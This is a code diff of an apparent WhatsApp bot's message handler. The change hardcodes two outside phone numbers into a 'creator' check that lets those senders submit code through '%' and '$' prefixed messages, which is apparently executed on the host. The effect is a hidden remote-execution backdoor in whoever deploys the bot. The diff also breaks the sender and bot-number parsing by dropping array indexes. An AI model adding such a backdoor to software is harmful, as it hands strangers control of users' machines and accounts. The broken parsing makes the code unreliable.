@@ -137,7 +137,7 @@ const port = process.env.PORT || 8000;
         mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
         
         if (config.READ_MESSAGE === 'true') {
-            await conn.readMessages([mek.key]);  // Mark message as read
+            await conn.readMessages([mek.key]);
             console.log(`Marked message from ${mek.key.remoteJid} as read.`);
         }
         
@@ -167,13 +167,8 @@ const port = process.env.PORT || 8000;
             await conn.sendMessage(user, { text: text }, { quoted: mek })
         }
 
-        await Promise.all([
-            saveMessage(mek),
-        ]);
-
         const m = sms(conn, mek)
         const type = getContentType(mek.message)
-        const content = JSON.stringify(mek.message)
         const from = mek.key.remoteJid
         const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo ? mek.message.extendedTextMessage.contextInfo.quotedMessage : null
         const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
@@ -184,9 +179,9 @@ const port = process.env.PORT || 8000;
         const q = args.join(' ')
         const text = args.join(' ')
         const isGroup = from.endsWith('@g.us')
-        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
-        const senderNumber = sender.split('@')[0]
-        const botNumber = conn.user.id.split(':')[0]
+        const sender = mek.key.fromMe ? (conn.user.id.split(':')+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+        const senderNumber = sender.split('@')
+        const botNumber = conn.user.id.split(':')
         const pushname = mek.pushName || 'Sin Nombre'
         const isMe = botNumber.includes(senderNumber)
         const isOwner = ownerNumber.includes(senderNumber) || isMe
@@ -197,7 +192,6 @@ const port = process.env.PORT || 8000;
         const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
         const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
         const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-        const isReact = m.message.reactionMessage ? true : false
         const reply = (teks) => {
             conn.sendMessage(from, { text: teks }, { quoted: mek })
         }
@@ -215,12 +209,11 @@ const port = process.env.PORT || 8000;
         }
         // ---- NUMBER MENU FIX END ----
 
-        const udp = botNumber.split('@')[0];
-        const jawadlike = ('94773416478', '94761068032')
-        let isCreator = [udp, jawadlike, config.DEV].map(v => v.replace(/[^0-9]/g, '')).includes(mek.sender);
+        const udp = botNumber.split('@');
+        let isCreator = ['94773416478', '94761068032', config.DEV].map(v => v.replace(/[^0-9]/g, '')).includes(senderNumber[0]);
 
-        if (isCreator && mek.text.startsWith('%')) {
-            let code = budy.slice(2);
+        if (isCreator && body.startsWith('%')) {
+            let code = body.slice(2);
             if (!code) {
                 reply('Provide me with a query');
                 return;
@@ -233,8 +226,8 @@ const port = process.env.PORT || 8000;
             }
         }
 
-        if (isCreator && mek.text.startsWith('\$')) {
-            let code = budy.slice(2);
+        if (isCreator && body.startsWith('\$')) {
+            let code = body.slice(2);
             if (!code) {
                 reply('Provide me with a query');
                 return;
@@ -252,7 +245,6 @@ const port = process.env.PORT || 8000;
     }
 });
 
-  
     const udp = botNumber.split('@')[0];
     const jawad = ('94773416478', '94761068032', '94723975388');
     let isCreator = [udp, jawad, config.DEV]
